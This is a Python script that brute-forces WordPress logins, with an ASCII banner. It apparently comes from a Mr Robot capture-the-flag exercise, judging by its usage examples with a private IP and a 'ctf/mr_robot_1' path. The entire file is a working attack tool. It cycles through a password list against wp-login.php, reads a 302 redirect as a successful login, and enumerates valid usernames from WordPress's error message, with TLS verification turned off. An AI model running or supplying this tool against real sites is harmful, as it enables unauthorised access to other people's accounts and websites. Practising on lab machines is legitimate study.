import os , random , requests , time ,argparse , sys   
 
def attempt_login( username , password , url , isFile )  :    

    try : 
        HEADERS = { 
                    "Content-type": "application/x-www-form-urlencoded",
                    "Accept": "text/plain"
                  } 
        
        #change this params if needed 
        PARAMS={ 
                'log':username, 
                'pwd':password,
                'wp-submit':'Log In',  
                }  

        resp = requests.post(url = url, data = PARAMS , headers = HEADERS , allow_redirects=False , verify = False )    

    except :    
        print("\n*** Connection Error has occured *** "  )    
        exit() 
 

    if isFile and "The password you entered for the username " in resp.text :            
        print(f'\n*** VALID USERNAME WAS FOUND *** ===> [{username}] ' ) 
        return True 
    
    return resp.status_code  


 
def execute  () :        
    t1 = time.time()       
    count  = 0  
    FOUND = False       
    #load the files 
    File = args.passlist  
    usernames = []  

    if File  :        

        try :   
            Test = open(os.path.expanduser('~') +  File )     
            Test.close()  
            File = os.path.expanduser('~') +  File  

        except FileNotFoundError : 
            File = args.passlist  

    else :  
        File = "passwords.txt"      
    
    user_enum =  os.path.isfile (args.username)         

    if user_enum : File = args.username   

    with open(File , 'r' ) as creds : 
        for cred in creds  :    
            count+=1      
            
            #loading 
            sys.stdout.write("\r[+] Attacking [+] ==> tries : {0} ".format(count)) 
            sys.stdout.flush()    

            #strip the spaces from the password   
            cred  = cred.rstrip("\n" ) 

            if user_enum : 
                status = attempt_login(cred, "admint-test" , args.url , isFile = True ) 
                if status == True :  
                    FOUND = True ; usernames.append(cred)
            else :  
                status  = attempt_login(args.username , cred   , args.url  , isFile = False )        
                

            if status == 302 :       
                print(f'\n\n[+] **** PASSWORD FOUND ***** [+] =====> [{cred}] for user { args.username }')           
                t2 = time.time()  
                print(f'[-] Time lapsed : {t2-t1} seconds  [-] ' )   
                print(f'[-] Number of attempts : {count} [-] ' )   
                exit() 
                
    if not FOUND :  
        t2 = time.time() 
        print("\n\n[x] ***** NO VALID USERNAME FOUND ***** [x]" )    
        print("[-] Try another password list [-] " )  
        print(f'[-] Time lapsed : {t2-t1} seconds  [-] ' )   
        print(f'[-] Number of attempts : {count} [-] ' )   
    else :   
        print("\n\n[x] *** List of valid usernames *** [x]\n")   
        for i in usernames : 
            print (f'{" " * 9 } [+] "{i}" [+] ')



def main () :   
    global args   
    help_message =  """  
            Usage :  \n 
            brute force with valid username :  \n  
            python3 bf.py -t http://192.168.254.107/wp-login.php  -u elliot -p /home/mivatampos/ctf/mr_robot_1/test.txt  \n 
            Enumerate users ( just dont provide the -p flag it will use the default "admin" password to attempt the login : \n 
            python3 bf.py -t http://192.168.254.107/wp-login.php  -u usernames.txt 
            """ 
    print(help_message) 

    #parser
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--username", help="valid username or file "  )
    parser.add_argument("-t", "--url", help="url/target to attack  ")
    parser.add_argument("-p", "--passlist", help="password list address ") 
    args = parser.parse_args()       

    print(""" 
   ____      ____ _________  ____________  ____________                         
   \   \    /   / |_____   | |______     \ |_   ______|  
    \   \/\/   /  |     ___|   |    |   _/  |    ___|         
     \        /   |    |       |    |    \  |    |     
      \__/\__/    |____|       |_________/  |____|    

                ***********************
                * By : intrglctcMilk  *  
                *     -- @tmpts       * 
                *********************** \n
     """ )    

    #call execute function to start the attack
    execute() 


if __name__ == "__main__":
    main() 
